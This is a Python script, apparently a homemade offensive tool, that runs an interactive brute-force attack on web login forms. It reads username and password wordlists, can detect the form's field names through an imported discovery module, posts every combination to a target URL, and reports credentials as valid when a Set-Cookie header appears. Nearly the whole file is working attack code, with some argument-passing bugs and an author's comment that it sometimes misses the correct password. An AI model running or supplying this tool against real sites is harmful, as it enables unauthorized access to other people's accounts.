#!/usr/bin/python3

from requests import session
import os, sys, itertools, time
import traceback

from multiprocessing.dummy import Pool as ThreadPool
from subprocess import check_call

import web_bfdiscovery as webbf
#import itertools

i = 0

def Begin():
	print("Welcome to the HTTP Brute Force Module")
	print("Target Host URL, [Username], and a Password File are required")
	print("-------------------------------------------------------------")
	Start0()
	
	

def Start0():
	disc = input('Is discovery required? [y]: ')
	if (disc == 'n'):
		Start1()
	elif (disc == "" or disc == 'y'):
		DisC0()
	else:
		Start0()


def Start1():
	targetURL = input('URL to Brute Force: ')
	Start2(targetURL)
	
def Start2(targetURL):	
	requireD = input('Does the URL Require a Username? [y]: ')
	if (requireD == 'n'):
		Start4(targetURL)
	elif (requireD == "" or requireD == 'y'):
		Start3(targetURL, 'X', 'XX')
	else:
		print('Please Select Y or N.')
		Start2(targetURL)
		
#def Start2b(targetURL):


#	req3 = raw_input('Confirm Values? [y]: ')
#	if (requireD == 'n'):
#		Start2b(targetURL)
#	elif (requireD == "" or 'y'):
#		Start3(targetURL, uNParam, pWParam)

# change to list file
def Start3(targetURL, uNParam, pWParam):
	uNParam = input('Username Field: ')
	pWParam = input('Password Field: ')
	uNFile = input('Username File: ')
	if os.path.isfile (uNFile):
		Start4(targetURL, uNFile, uNParam, pWParam)
	else:
		print("Please enter valid username file.")
		Start3(targetURL, uNParam, pWParam)

	
# rename argument to list file
def Start4(targetURL, uNFile, uNParam, pWParam):
	httppwFile = input("Password File: ")
	if os.path.isfile (httppwFile):
		Confirm(targetURL, uNFile, httppwFile, uNParam, pWParam)
	else:
		print("Please enter valid password file.")
		Start4(targetURL, uNFile, uNParam, pWParam)

def Confirm(targetURL, uNFile, httppwFile, uNParam, pWParam):
	httpbfanswer = input("All required fields loaded. Start?: [y]: ")
	if (httpbfanswer == 'n'):
			print('why are you even here then?')
	elif (httpbfanswer == "" or httpbfanswer == 'y'):
			multiProc(targetURL, uNFile, httppwFile, uNParam, pWParam)
	else:
			print("please pick y or n.")
			Confirm(targetURL, uNFile, httppwFile, uNParam, pWParam)

def multiProc(targetURL, uNFile, httppwFile, uNParam, pWParam):
	total = sum(1 for line in open(httppwFile))
#	pooL = ThreadPool(1)
#	passworD = []
	if (uNFile == 'NULLuName'):
		awshet = [targetURL, uNParam, pWParam, total]
		uN = 'NULLuName'		
		with open(httppwFile) as BANG:	
			for pD in BANG:
#				passworD.append(pD)
				progress(i, total)
				HTTPBruteForce(uN, pD, awshet)
	else:
		awshet = [targetURL, uNParam, pWParam, total]
		with open(uNFile) as GUY:
			for uN in GUY:
				with open(httppwFile) as BANG:		
					for pD in BANG:
#						passworD.append(pD)
						progress(i, total)
						HTTPBruteForce(uN, pD, awshet)
#	bFResults = pooL.map( HTTPBruteForce, itertools.izip(passworD, itertools.repeat(awshet)))
#	pooL.close()
#	pooL.join()
	BFFinal()
##-------------------------------
# BRUTE FORCE PORTION #
#--------------------------------
def HTTPBruteForce(uN, pW, cB):
	global i
	tG, uNP, pWP ,tT = cB
	if (uN == 'NULLuName'):
		payload = {
			'action': 'login',	
			pWP: pW
		}
	else:
		payload = {
			'action': 'login',
			uNP: uN,	
			pWP: pW
			}
##-------------------------------------------------------------------------
# CODE WILL SOMETIMES PASS OVER CORRECT PASSWORD. THIS IS POTENTIALLY DUE TO A
# PROBLEM WILL THE CONNECTION OR REMOTE HOST.
#--------------------------------------------------------------------------		  
	with session() as c:
		resultS = c.post(tG, data=payload)
		time.sleep(1)
		if 'Set-Cookie' not in resultS.headers:
#		if 'Moved Temporarily' in resultS.headers:
#		if (resultS.headers['Connection'] == 'close'):
			i = i + 1
			progress(i, tT)
#			print((resultS.headers))
#			print(resultS)
#			pass
		else:
			i = i + 1
			progress(i, tT)
			if (uN == 'NULLuName'):
				print(('\nSuccessfull Login - Password: %s' % (pW)))
#				print((resultS.headers))
#				print(resultS)
#				print((resultS.status_code))
				os._exit(1)
			else:	
				print(('\nSuccessfull login - Username: %s Password: %s' % (uN, pW)))
#				print((resultS.headers))
#				print(resultS)	
#				print((resultS.status_code))
				os._exit(1)		
##-------------------------------------------------------##
## For debugging later 	
##-------------------------------------------------------##
#	c.post('http://192.168.5.250/login.cgi', data=payload)
#	response = c.get('http://192.168.5.250/index.htm')
#	print(response.headers)
#	print(resultS.text)
#	print(response.text)
#	print(resultS)
#	print(response)
#
##-------------------------------------------------------##
def progress(count, total):
	bar_len = 38
	filled_len = int(round(bar_len * count / float(total)))
	percents = round(100.0 * count / float(total), 1)
	bar = '#' * filled_len + '=' * (bar_len - filled_len)
	space = '{message: <0}'.format(message='')
	sys.stdout.write('%s/%s || %s [%s] %s%s Exhausted\r' % (i, total, space, bar, percents, '%'))
	sys.stdout.flush()

def BFFinal():
	print("--------------------------------------------------------")
	print('Exiting HTTTP Brute Force Module by JOE MAMA')
	print("--------------------------------------------------------")
	exit()
##----------------------------------------------------------
## Discovery Call
##----------------------------------------------------------
def DisC0():

	urL = input('Target URL?: ')
	con = input('Confirm URL? [y]: ')
	if (con == "" or con == 'y'):
		DisC1(urL)
	elif (con == 'n'):
		DisC0()
	else:
		print('??')
	
def DisC1(urL):
	try:
		dreS = webbf.Disc(urL)
		if (len(dreS) == 2):
			urLParams = dreS[0]
			CredParams = dreS[1]
			urLParam = str(urLParams)
			if (len(CredParams) == 1):
				pWParams = CredParams[0]
				pWParam = str(pWParams)
				uNParam = 'NULL'
			elif (len(CredParams) == 2):
				uNParams, pWParams = CredParams
				uNParam = str(uNParams) 
				pWParam = str(pWParams)
			targetURL = urL + '/' + urLParam
			DisC2(targetURL, uNParam, pWParam)
		else:
			print('who knows what the fuck is going on?')
	except Exception as LAME:
		print(LAME)
		traceback.print_exc()
		

def DisC2(targetURL, uNParam, pWParam):
	if (uNParam == 'NULL'):
		print(('URL: %s' % (targetURL))) 
		print(('Password Field: %s' % (pWParam)))
	else: 
		print(('URL: %s' % (targetURL))) 
		print(('Login Fields - UN: %s PW: %s' % (uNParam, pWParam)))
	coN = input('Commit these values? [y]: ')
	if (coN == "" or coN == 'y'):
		if (uNParam != 'NULL'):
			Start3(targetURL, uNParam, pWParam)
		else:
			Start4(targetURL, 'NULLuName', uNParam, pWParam)
	elif (coN == 'n'):
		pass
		#tell user to f off?
	else:
		print('??')


##-----------
# 
##------------
if __name__ == '__main__':
	try: 
		Start0()
	except Exception as E:
		print(E)
	except KeyboardInterrupt:
			print("\n--------------------------------------------------------")
